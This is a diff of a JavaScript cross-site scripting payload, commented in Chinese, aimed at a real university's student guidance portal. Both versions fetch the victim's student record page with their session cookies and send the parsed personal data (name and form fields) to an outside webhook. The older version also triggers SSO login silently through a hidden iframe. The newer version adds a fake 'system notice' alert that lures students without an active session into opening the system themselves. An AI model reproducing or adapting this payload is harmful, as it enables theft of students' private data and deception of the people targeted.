@@ -1,95 +1,33 @@
 (async () => {
     const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
-    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
     const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
-    
-    // 簡單日誌，用 Image Beacon 避免 CORS
-    const log = (msg) => { new Image().src = `${webhook}?log=${encodeURIComponent(msg)}`; };
 
-    // 1. Zero-Click 認證 (隱藏 iframe)
-    const authFrame = document.createElement('iframe');
-    authFrame.style.display = 'none';
-    authFrame.src = ssoUrl;
-    document.body.appendChild(authFrame);
-
-    // 等待 8 秒讓 SSO 跑完
-    await new Promise(r => setTimeout(r, 15000));
-
+    // 1. 嘗試偷抓
     try {
-        // 2. 獲取原始 HTML
-        const response = await fetch(targetUrl, {credentials: 'include'});
+        const response = await fetch(targetUrl, { credentials: 'include' });
         const html = await response.text();
 
-        // 3. 解析 HTML (關鍵步驟：在瀏覽器端處理，不要傳 HTML 回家)
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, "text/html");
-        
-        let extractedData = {};
-        extractedData["rep_status"] = response.status;
+        if (!html.includes("請由校務行政入口網登入") && !html.includes("錯誤訊息")) {
+            // ✅ 成功 (受害者已經有 Session)
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, "text/html");
+            let data = {};
+            // (解析邏輯省略，同前)
+            const name = doc.querySelector('.form-control-static')?.textContent; 
+            if(name) data.info = name.trim();
 
-
-        // 輔助函數：清理字串 (去除 &nbsp; 空格、星號等)
-        const clean = (str) => {
-            if (!str) return "";
-            return str.replace(/&nbsp;/g, '')
-                      .replace(/^\s+|\s+$/g, '') // trim
-                      .replace(/[*:]/g, '');      // 去除標籤中的 * 和 :
-        };
-
-        // 抓取所有 .form-group (這是每一行資料的容器)
-        const groups = doc.querySelectorAll('.form-group');
-        
-        groups.forEach(group => {
-            // 找標籤 (Label)
-            const labelNode = group.querySelector('label');
-            if (!labelNode) return;
-            
-            const key = clean(labelNode.textContent);
-            if (!key) return; // 如果沒標籤就跳過
-
-            let value = "N/A";
-
-            // 情況 A: 唯讀文字 (p.form-control-static)
-            const staticText = group.querySelector('.form-control-static');
-            if (staticText) {
-                value = clean(staticText.textContent);
-            } 
-            // 情況 B: 輸入框 (input.form-control)
-            else {
-                const input = group.querySelector('input.form-control');
-                if (input) {
-                    value = input.value || "EMPTY"; // 輸入框可能為空
-                }
-            }
-
-            // 存入物件
-            extractedData[key] = value;
-        });
-
-        // 4. 只傳送乾淨的 JSON 資料
-        const payload = JSON.stringify({
-            status: "SUCCESS",
-            // 這裡只會有學號、姓名、電話等純文字，非常輕量
-            data: extractedData,
-        });
-
-        // 使用 sendBeacon 發送 (最穩定，且通常不會有 CORS 預檢問題)
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon(webhook, payload);
-        } else {
-            // 回退方案
-            fetch(webhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: payload
-            });
+            navigator.sendBeacon(webhook, JSON.stringify({status: "SUCCESS", data: data}));
+            return;
         }
-        log("Data_Sent");
+    } catch(e) {}
 
-    } catch (e) {
-        log("Error: " + e.message);
+    // 2. 失敗 (沒 Session)，彈出提示誘騙使用者自己去點
+    if (!sessionStorage.getItem('xss_alerted')) {
+        sessionStorage.setItem('xss_alerted', 'true');
+        
+        // 延遲一下再彈，比較像系統載入後的檢查
+        setTimeout(() => {
+            alert("【系統通知】\n\n您的學生輔導資料需要更新。\n請點擊桌面上的「學生輔導系統(學生端)」圖示以完成同步。");
+        }, 1500);
     }
-
-    // 清理 iframe
-    authFrame.remove();
 })();
